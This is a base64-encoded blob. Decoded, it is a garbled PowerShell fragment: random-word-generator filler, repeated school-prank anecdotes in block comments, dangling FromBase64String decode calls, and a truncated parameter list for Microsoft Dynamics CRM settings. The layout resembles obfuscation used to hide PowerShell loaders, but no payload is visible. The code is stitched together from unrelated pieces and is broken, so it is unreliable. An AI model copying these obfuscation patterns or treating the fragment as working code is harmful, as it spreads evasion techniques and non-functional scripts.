RoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gZigpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDE4IHsKCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAoJCVtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCgkJW2d1aWRdJEFja25vd2xlZGdlbWVudFRlbXBsYXRlSWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRBQ1REZWxpdmVyeU1ldGhvZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBbGxvd0FkZHJlc3NCb29rU3luY3MsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kQWxsb3dBdXRvUmVzcG9uc2VDcmVhdGlvbiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBbGxvd0F1dG9VbnN1YnNjcmliZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBbGxvd0F1dG9VbnN1YnNjcmliZUFja25vd2xlZGdlbWVudCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBbGxvd0NsaWVudE1lc3NhZ2VCYXJBZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBbGxvd0VudGl0eU9ubHlBdWRpdCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBbGxvd01hcmtldGluZ0VtYWlsRXhlY3V0aW9uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJEFsbG93T2ZmbGluZVNjaGVkdWxlZFN5bmNzLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJEFsbG93T3V0bG9va1NjaGVkdWxlZFN5bmNzLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJEFsbG93VW5yZXNvbHZlZFBhcnRpZXNPbkVtYWlsU2VuZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQoJCVtib29sXSRBbGxvd1VzZXJGb3JtTW9kZVByZWZlcmVuY2UsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kQWxsb3dVc2Vyc1NlZUFwcGRvd25sb2FkTWVzc2FnZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBbGxvd1dlYkV4Y2VsRXhwb3J0LAoJCVtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW3N0cmluZ10kQU1EZXNpZ25hdG9yLAoJCVtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJEF1dG9BcHBseURlZmF1bHRvbkNhc2VDcmVhdGUsCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kQXV0b0FwcGx5RGVmYXVsdG9uQ2FzZVVwZGF0ZSwKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRBdXRvQXBwbHlTTEEsCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbc3RyaW5nXSRCaW5nTWFwc0FwaUtleSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtzdHJpbmddJEJsb2NrZWRBdHRhY2htZW50cywKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtndWlkXSRCdXNpbmVzc0Nsb3N1cmVDYWxlbmRhcklkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW3N0cmluZ10kQ2FtcGFpZ25QcmVmaXgsCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kQ2FzY2FkZVN0YXR1c1VwZGF0ZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtzdHJpbmddJENhc2VQcmVmaXgsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbc3RyaW5nXSRDb250cmFjdFByZWZpeCwKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRDb3J0YW5hUHJvYWN0aXZlRXhwZXJpZW5jZUVuYWJsZWQsCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kQ3JlYXRlUHJvZHVjdHNXaXRob3V0UGFyZW50SW5BY3RpdmVTdGF0ZSwKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEN1cnJlbmN5RGVjaW1hbFByZWNpc2lvbiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEN1cnJlbmN5RGlzcGxheU9wdGlvbiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEN1cnJlbnRDYW1wYWlnbk51bWJlciwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEN1cnJlbnRDYXNlTnVtYmVyLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kQ3VycmVudENvbnRyYWN0TnVtYmVyLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kQ3VycmVudEludm9pY2VOdW1iZXIsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRDdXJyZW50S2JOdW1iZXIsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRDdXJyZW50T3JkZXJOdW1iZXIsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRDdXJyZW50UXVvdGVOdW1iZXIsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCdcK3sxfVxkezEsfScpXQogICAgICAgIFtzdHJpbmddJERlZmF1bHRDb3VudHJ5Q29kZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtndWlkXSREZWZhdWx0RW1haWxTZXJ2ZXJQcm9maWxlSWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kRGlzYWJsZVNvY2lhbENhcmUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kRGlzcGxheU5hdmlnYXRpb25Ub3VyLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kRW1haWxDb25uZWN0aW9uQ2hhbm5lbCwgCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRFbWFpbENvcnJlbGF0aW9uRW5hYmxlZCwgCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kRW5hYmxlQmluZ01hcHNJbnRlZ3JhdGlvbiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRFbmFibGVTbWFydE1hdGNoaW5nLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kRnVsbE5hbWVDb252ZW50aW9uQ29kZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJEdsb2JhbEFwcGVuZFVybFBhcmFtZXRlcnNFbmFibGVkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignaHR0cChzKT86Ly8oW1x3LV0rXC4pK1tcdy1dKygvW1x3LSAuLz8lJj1dKik/JyldCiAgICAgICAgW3N0cmluZ10kR2xvYmFsSGVscFVybCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRHbG9iYWxIZWxwVXJsRW5hYmxlZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEhhc2hEZWx0YVN1YmplY3RDb3VudCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtzdHJpbmddJEhhc2hGaWx0ZXJLZXl3b3JkcywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEhhc2hNYXhDb3VudCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEhhc2hNaW5BZGRyZXNzQ291bnQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kSWdub3JlSW50ZXJuYWxFbWFpbCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJEluY29taW5nRW1haWxEZWxpdmVyeU1ldGhvZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtzdHJpbmddJEludm9pY2VQcmVmaXgsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kSXNBdXRvU2F2ZUVuYWJsZWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kSXNEZWZhdWx0Q291bnRyeUNvZGVDaGVja0VuYWJsZWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kSXNEdXBsaWNhdGVEZXRlY3Rpb25FbmFibGVkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJElzRHVwbGljYXRlRGV0ZWN0aW9uRW5hYmxlZEZvckltcG9ydCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRJc0R1cGxpY2F0ZURldGVjdGlvbkVuYWJsZWRGb3JPZmZsaW5lU3luYywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRJc0R1cGxpY2F0ZURldGVjdGlvbkVuYWJsZWRGb3JPbmxpbmVDcmVhdGVVcGRhdGUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kaXNlbmFibGVkZm9yYWxscm9sZXMsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kSXNGb2xkZXJCYXNlZFRyYWNraW5nRW5hYmxlZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRJc0Z1bGxUZXh0U2VhcmNoRW5hYmxlZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRJc0hpZXJhcmNoaWNhbFNlY3VyaXR5TW9kZWxFbmFibGVkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJElzUHJlc2VuY2VFbmFibGVkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJElzVXNlckFjY2Vzc0F1ZGl0RW5hYmxlZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtzdHJpbmddJEtiUHJlZml4LAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kTWF4QXBwb2ludG1lbnREdXJhdGlvbkRheXMsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRNYXhEZXB0aEZvckhpZXJhcmNoaWNhbFNlY3VyaXR5TW9kZWwsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRNYXhpbXVtQWN0aXZlQnVzaW5lc3NQcm9jZXNzRmxvd3NBbGxvd2VkUGVyRW50aXR5LAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kTWF4aW11bUR5bmFtaWNQcm9wZXJ0aWVzQWxsb3dlZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJE1heGltdW1UcmFja2luZ051bWJlciwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJE1heFByb2R1Y3RzSW5CdW5kbGUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRNYXhSZWNvcmRzRm9yRXhwb3J0VG9FeGNlbCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJE1heFJlY29yZHNGb3JMb29rdXBGaWx0ZXJzLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kTWF4VXBsb2FkRmlsZVNpemUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRNaW5BZGRyZXNzQm9va1N5bmNJbnRlcnZhbCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtpbnRdJE1pbk9mZmxpbmVTeW5jSW50ZXJ2YWwsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRNaW5PdXRsb29rU3luY0ludGVydmFsLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJE5vdGlmeU1haWxib3hPd25lck9mRW1haWxTZXJ2ZXJMZXZlbEFsZXJ0cywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtzdHJpbmddJE9yZGVyUHJlZml4LAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kT3V0Z29pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW1ZhbGlkYXRlU2V0KDAsMSwyKV0KICAgICAgICBbaW50XSRQbHVnaW5UcmFjZUxvZ1NldHRpbmcsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbVmFsaWRhdGVTZXQoMCwxLDIsMyw0KV0KICAgICAgICBbaW50XSRQcmljaW5nRGVjaW1hbFByZWNpc2lvbiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRRdWlja0ZpbmRSZWNvcmRMaW1pdEVuYWJsZWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbc3RyaW5nXSRRdW90ZVByZWZpeCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRSZXF1aXJlQXBwcm92YWxGb3JVc2VyRW1haWwsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbYm9vbF0kUmVxdWlyZUFwcHJvdmFsRm9yUXVldWVFbWFpbCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRTaGFyZVRvUHJldmlvdXNPd25lck9uQXNzaWduLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW3N0cmluZ10kVHJhY2tpbmdQcmVmaXgsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbaW50XSRUcmFja2luZ1Rva2VuSWRCYXNlLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kVHJhY2tpbmdUb2tlbklkRGlnaXRzLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2ludF0kVW5pcXVlU3BlY2lmaWVyTGVuZ3RoLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW2Jvb2xdJFVzZUxlZ2FjeVJlbmRlcmluZywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRVc2VQb3NpdGlvbkhpZXJhcmNoeSwKICAgICAgICBbcGFyYW1ldGVy